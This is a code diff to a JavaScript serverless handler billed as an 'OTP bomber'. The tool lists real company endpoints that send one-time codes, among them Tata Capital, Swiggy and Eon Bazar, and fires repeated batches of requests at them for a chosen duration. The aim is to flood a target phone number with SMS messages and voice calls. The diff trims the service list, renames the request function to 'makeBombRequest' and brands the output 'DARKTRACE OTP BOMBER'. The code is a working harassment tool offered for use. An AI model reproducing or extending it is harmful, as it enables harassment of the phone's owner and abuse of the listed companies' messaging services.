@@ -14,7 +14,7 @@ try {
   console.error('Error loading keys.json:', error);
 }
 
-// Services list
+// Working OTP services
 const services = [
   {
     name: "Tata Capital",
@@ -24,15 +24,8 @@ const services = [
     body: (phone) => JSON.stringify({ mobileNumber: phone })
   },
   {
-    name: "Apollo 247",
-    type: "VOICE CALL",
-    url: "https://apigateway.apollo247.in/voice/otp",
-    method: "POST", 
-    body: (phone) => JSON.stringify({ phone: phone })
-  },
-  {
     name: "Swiggy",
-    type: "VOICE CALL",
+    type: "VOICE CALL", 
     url: "https://profile.swiggy.com/api/v1/otp/send",
     method: "POST",
     body: (phone) => JSON.stringify({ mobile: phone })
@@ -59,13 +52,6 @@ const services = [
     body: (phone) => JSON.stringify({ phone_number: phone })
   },
   {
-    name: "Shikho",
-    type: "SMS",
-    url: "https://api.shikho.com/auth/otp/send",
-    method: "POST",
-    body: (phone) => JSON.stringify({ phone: phone })
-  },
-  {
     name: "Eon Bazar",
     type: "SMS",
     url: "https://app.eonbazar.com/api/v1/otp",
@@ -88,8 +74,8 @@ const services = [
   }
 ];
 
-// Make request to service
-async function makeRequest(service, phone, batchNum, requestNum) {
+// Make bomb request
+async function makeBombRequest(service, phone, batchNum, requestNum) {
   try {
     const response = await fetch(service.url, {
       method: service.method,
@@ -187,7 +173,7 @@ export default async function handler(req, res) {
   const endTime = new Date(startTime.getTime() + durationNum * 60000);
 
   // Send initial response
-  res.write(`🚀 OTP BOMBER STARTED\n`);
+  res.write(`🚀 DARKTRACE OTP BOMBER STARTED\n`);
   res.write(`📞 Target: ${formattedPhone}\n`);
   res.write(`⏰ Duration: ${durationNum} minutes\n`);
   res.write(`🔁 Running until: ${endTime.toLocaleString()}\n`);
@@ -203,7 +189,7 @@ export default async function handler(req, res) {
     res.write(`🎯 BATCH #${batchCount} STARTED\n`);
 
     const promises = services.map((service, index) => 
-      makeRequest(service, formattedPhone, batchCount, index + 1)
+      makeBombRequest(service, formattedPhone, batchCount, index + 1)
     );
 
     try {
